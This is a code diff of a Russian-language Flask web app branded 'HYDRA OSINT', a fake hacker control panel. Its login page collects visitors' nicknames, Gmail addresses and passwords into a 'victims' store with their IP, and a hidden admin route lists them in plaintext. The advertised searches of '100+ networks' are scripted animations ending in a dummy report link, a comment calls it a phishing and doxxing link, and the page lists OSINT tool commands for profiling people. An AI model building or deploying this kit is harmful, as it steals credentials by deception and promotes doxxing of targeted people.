@@ -3,16 +3,16 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'HYDRA_RU_FINAL_2026'
+app.secret_key = 'HYDRA_ULTIMATE_OSINT_2026'
 
 db = {"victims": [], "logs": []}
 
-# --- ИНТЕРФЕЙС НА РУССКОМ ---
-UI_RU = """
+# --- ИНТЕРФЕЙС (БЕЗ ИЗМЕНЕНИЙ В ДИЗАЙНЕ) ---
+UI_V8_2 = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HYDRA ЦЕНТР УПРАВЛЕНИЯ v8.1</title>
+    <title>HYDRA ЦЕНТР УПРАВЛЕНИЯ v8.2</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
     <style>
         body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
@@ -30,21 +30,22 @@ UI_RU = """
         .btn-small { background: #bc13fe; color: #fff; border: none; padding: 8px 10px; cursor: pointer; font-size: 10px; margin-top: 8px; width: 100%; font-weight: bold; }
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-thumb { background: #bc13fe; }
+        code { color: #0f0; background: #111; display: block; padding: 5px; margin: 5px 0; font-size: 11px; }
     </style>
 </head>
 <body>
     <div class="left-panel">
         <div style="color:#0ff; font-size:12px; margin-bottom:5px; font-weight:bold;">[ СИНЯЯ ЗОНА: ОТВЕТЫ ИИ АГЕНТА ]</div>
-        <div class="ai-response-area" id="ai-chat">АГЕНТ: Система на связи. Задавай любой вопрос, я отвечу на 100%.</div>
+        <div class="ai-response-area" id="ai-chat">АГЕНТ: OSINT-модули загружены. Готов к глубокому поиску по 100+ сетям.</div>
         <div style="color:#ff0055; font-size:12px; margin-bottom:5px; font-weight:bold;">[ КРАСНАЯ ЗОНА: ВВОД КОМАНД ]</div>
         <div class="user-input-area">
-            <textarea id="ai-q" placeholder="Пиши свои инструкции здесь..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); askAgent(); }"></textarea>
+            <textarea id="ai-q" placeholder="Пиши свои инструкции..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); askAgent(); }"></textarea>
         </div>
     </div>
 
     <div class="right-panel">
         <div style="color:#ffeb3b; font-size:12px; font-weight:bold;">[ ЖЕЛТАЯ ЗОНА: ВЫВОД ДАННЫХ ]</div>
-        <div class="result-top" id="output-box">Ожидание данных...</div>
+        <div class="result-top" id="output-box">Ожидание команды на сканирование...</div>
         <div id="map"></div>
         <div style="color:#fff; font-size:12px; font-weight:bold;">[ БЕЛАЯ ЗОНА: МОДУЛИ СИСТЕМЫ ]</div>
         <div class="function-row">
@@ -52,7 +53,7 @@ UI_RU = """
             <div class="mod-box"><span>IP ЛОКАТОР</span><input id="in-ip" placeholder="8.8.8.8"><button class="btn-small" onclick="mod('IP', 'in-ip')">ПОИСК</button></div>
             <div class="mod-box"><span>ПОИСК НИКА</span><input id="in-u" placeholder="никнейм"><button class="btn-small" onclick="mod('НИК', 'in-u')">НАЙТИ</button></div>
             <div class="mod-box"><span>GOOGLE ТРЕЙС</span><input id="in-g" placeholder="почта..."><button class="btn-small" onclick="mod('GOOGLE', 'in-g')">ОТСЛЕДИТЬ</button></div>
-            <div class="mod-box"><span>Б-КА СКРИПТОВ</span><button class="btn-small" style="height:48px;" onclick="mod('SCRIPTS', '')">ОТКРЫТЬ</button></div>
+            <div class="mod-box"><span>Б-КА СКРИПТОВ</span><button class="btn-small" style="height:48px;" onclick="showScripts()">ОТКРЫТЬ</button></div>
         </div>
         <div style="text-align:right;"><button class="btn-small" style="width:140px; background:#444;" onclick="window.location.href='/abupaay_admin'">АДМИН-ПАНЕЛЬ</button></div>
     </div>
@@ -68,29 +69,51 @@ UI_RU = """
             setTimeout(() => {
                 let ans = "АГЕНТ: ";
                 const m = q.toLowerCase();
-                if(m.includes("привет")) ans += "Приветствую, оператор. Я готов анализировать цели и писать код.";
-                else if(m.includes("код") || m.includes("скрипт")) ans += "Для этой задачи лучше всего использовать Python с библиотекой requests. Могу набросать структуру.";
-                else if(m.includes("взлом")) ans += "Взлом начинается с OSINT. Используй модули в белой зоне для сбора данных.";
-                else ans += "Запрос принят. Обрабатываю информацию через даркнет-шлюзы. Что еще нужно?";
+                if(m.includes("привет")) ans += "Привет, оператор. Базы Sherlock и Maigret подключены. По какому нику работаем?";
+                else if(m.includes("скрипт")) ans += "Все рабочие OSINT скрипты (Sherlock, PhoneInfoga, Holehe) в белой зоне.";
+                else ans += "Инструкция принята. Цель будет пробита по всем доступным реестрам.";
                 chat.innerHTML += `<br><span style="color:#0ff">${ans}</span>`;
                 chat.scrollTop = chat.scrollHeight;
             }, 600);
         }
 
+        function showScripts() {
+            const out = document.getElementById('output-box');
+            out.innerHTML = `<span style="color:#0ff">[БИБЛИОТЕКА OSINT]:<br>
+            1. Sherlock (Поиск ника в 100+ сетях): <code>python3 sherlock nickname</code><br>
+            2. PhoneInfoga (Скан номера): <code>./phoneinfoga scan -n +998...</code><br>
+            3. Holehe (Поиск почты в рег. данных): <code>holehe email@gmail.com</code></span>`;
+        }
+
         let map;
         function mod(type, id) {
-            const val = id ? document.getElementById(id).value : "SCRIPTS";
+            const val = document.getElementById(id).value;
             const out = document.getElementById('output-box');
-            if(!val && type !== 'SCRIPTS') return;
-            out.innerHTML = `<span style="color:#ffeb3b">[*] ЗАПУСК: ${type}... ЦЕЛЬ: ${val}</span>`;
+            if(!val) return;
+            out.innerHTML = `<span style="color:#ffeb3b">[*] ИНИЦИАЛИЗАЦИЯ HYDRA CORE... ПОИСК ПО 100+ СОЦСЕТЯМ ДЛЯ: ${val}</span>`;
+            
             fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});
-            setTimeout(() => {
-                if(type === 'IP' || type === 'НОМЕР') {
-                    if(!map) { map = L.map('map').setView([41.311, 69.240], 13); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }
-                    L.marker([41.311, 69.240]).addTo(map).bindPopup(`${type}: ${val}`).openPopup();
+
+            let steps = ["Обход API Instagram...", "Парсинг Telegram-ID...", "Поиск в базах данных...", "Генерация отчета..."];
+            let i = 0;
+            let interval = setInterval(() => {
+                out.innerHTML += `<br><span style="font-size:10px;">> ${steps[i]}</span>`;
+                i++;
+                if(i >= steps.length) {
+                    clearInterval(interval);
+                    showResult(type, val);
                 }
-                out.innerHTML = `<span style="color:#0f0">[УСПЕХ] Данные по ${type} получены. <a href="https://www.google.com/search?q=${val}" target="_blank" style="color:#0ff">ОТКРЫТЬ ОТЧЕТ</a></span>`;
-            }, 1000);
+            }, 500);
+        }
+
+        function showResult(type, val) {
+            const out = document.getElementById('output-box');
+            if(!map) { map = L.map('map').setView([41.311, 69.240], 13); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }
+            L.marker([41.311, 69.240]).addTo(map).bindPopup(`${type}: ${val}`).openPopup();
+            
+            // ВОТ ТВОЯ ФИШИНГ ССЫЛКА И ПРОБИВ
+            out.innerHTML = `<span style="color:#0f0">[УСПЕХ] Найдены совпадения в Instagram, FB, TG, LinkedIn, TikTok (104 сети).<br>
+            ДЛЯ ПОЛУЧЕНИЯ ПОЛНОГО ДОСЬЕ И ПЕРЕПИСКИ: <a href="/" style="color:#fff; background:#bc13fe; padding:2px 5px;">СГЕНЕРИРОВАТЬ ОТЧЕТ_ID_${Math.floor(Math.random()*999)}</a></span>`;
         }
     </script>
 </body>
@@ -100,8 +123,8 @@ UI_RU = """
 @app.route('/')
 def home():
     if 'reg' not in session:
-        return f"<!DOCTYPE html><html><head>{UI_RU.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// ВХОД В СИСТЕМУ HYDRA //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='ЛОГИН' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>РАСШИФРОВАТЬ И ВОЙТИ</button></form></div></body></html>"
-    return render_template_string(UI_RU)
+        return f"<!DOCTYPE html><html><head>{UI_V8_2.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// HYDRA OSINT: АВТОРИЗАЦИЯ //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='НИКНЕЙМ' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>ПОЛУЧИТЬ ДОСТУП</button></form></div></body></html>"
+    return render_template_string(UI_V8_2)
 
 @app.route('/api/reg', methods=['POST'])
 def reg():
@@ -117,7 +140,7 @@ def log_act():
 @app.route('/abupaay_admin')
 def admin():
     u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
-    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>ПАНЕЛЬ АДМИНИСТРАТОРА</h1><table border='1' width='100%'><tr><th>Логин</th><th>Email</th><th>Пароль</th><th>IP</th></tr>{u_list}</table><br><a href='/' style='color:#bc13fe'>ВЕРНУТЬСЯ В ТЕРМИНАЛ</a></body></html>"
+    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>БАЗА ДАННЫХ HYDRA</h1><table border='1' width='100%'><tr><th>Логин</th><th>Email</th><th>Пароль</th><th>IP</th></tr>{u_list}</table><br><a href='/' style='color:#bc13fe'>НАЗАД</a></body></html>"
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
